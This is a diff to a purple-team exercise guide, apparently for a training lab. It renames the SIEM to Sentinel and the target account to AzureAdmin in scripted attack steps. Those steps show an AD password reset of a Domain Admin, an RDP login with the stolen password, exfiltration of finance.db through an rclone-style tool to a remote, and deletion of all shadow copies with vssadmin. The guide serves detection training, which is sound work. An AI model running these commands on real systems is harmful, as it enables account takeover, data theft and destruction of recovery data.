@@ -6,9 +6,9 @@
 - For the purple team exercise we need to define one red team lead who will do the emulation **Steps in Kali Linux, please define that person now
 - During emulation the others watch the actions performed and assist the acting red teamer of their table team
 - Define one blue lead who will coordinate the table's blue verification and documentation activites
-- All participants can use Splunk and Google Documents in parallel so you can cooperate in the blue team verification tasks
+- All participants can use Sentinel and Google Documents in parallel so you can cooperate in the blue team verification tasks
 - We will perform the attack simulation in multiple stages always first red and then blue
-- After running through the emulation steps it will take up to 5' for the detection events to show up in Splunk as "notables"
+- After running through the emulation steps it will take up to 5' for the detection events to show up in Sentinel as "notables"
 - We will not actually do IR but feel free to discuss blue IR actions as time permits
 
 ## Setup
@@ -219,7 +219,7 @@ We mark our AD user as compromised and then we find a path from the compromised 
 
 ![Bloodhound Domain Admins privilege escalation path](images/bloodhound.png)
 
-We can see that our compromised user is a member of `ServerAdmins` group which has `GenericWrite` permissions over the `ITSupport` group which in turn has `AllExtendedRights` over `Administrator` who is Domain Admin.
+We can see that our compromised user is a member of `ServerAdmins` group which has `GenericWrite` permissions over the `ITSupport` group which in turn has `AllExtendedRights` over `AzureAdmin` who is Domain Admin.
 
 ### AD Privilege Escalation
 
@@ -249,7 +249,7 @@ You will need to close the current PowerShell window and open it again from `mim
 
 **Step 18**
 ```PowerShell
-[ITSERVER:PowerShell] Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString 'DomainPwned!' -AsPlainText -Force) -Reset
+[ITSERVER:PowerShell] Set-ADAccountPassword -Identity "AzureAdmin" -NewPassword (ConvertTo-SecureString 'DomainPwned!' -AsPlainText -Force) -Reset
 ```
 ATT&CK Techniques: `T1098`
 
@@ -260,7 +260,7 @@ With Domain Admin privileges we can now finally log into the 3rd server.
 
 **Step 19**
 ```bash
-[KALI:bash] xfreerdp3 /u:Administrator /p:'DomainPwned!' /d:ATTACKRANGE /v:10.0.1.16 /cert:ignore +clipboard
+[KALI:bash] xfreerdp3 /u:AzureAdmin /p:'DomainPwned!' /d:ATTACKRANGE /v:10.0.1.16 /cert:ignore +clipboard
 ```
 ATT&CK Techniques: `T1021.001` `T1078`
 
@@ -304,7 +304,7 @@ And finally we exfiltrate the files that we want (make sure PowerShell is runnni
 
 **Step 23**
 ```PowerShell
-[FINSERVER:PowerShell] C:\Temp\r.exe --config C:\Temp\r.conf copy C:\Users\Administrator\Documents\finance.db ss:data --no-check-dest
+[FINSERVER:PowerShell] C:\Temp\r.exe --config C:\Temp\r.conf copy C:\Users\AzureAdmin\Documents\finance.db ss:data --no-check-dest
 ```
 ATT&CK Techniques: `T1048`
 
@@ -312,7 +312,7 @@ Having exfiltrated the files, let's delete them and all shadow copies using `vss
 
 **Step 24**
 ```PowerShell
-[FINSERVER:PowerShell] rm C:\Users\Administrator\Documents\finance.db
+[FINSERVER:PowerShell] rm C:\Users\AzureAdmin\Documents\finance.db
 [FINSERVER:PowerShell] vssadmin.exe delete shadows /all
 ```
 ATT&CK Techniques: `T1490`
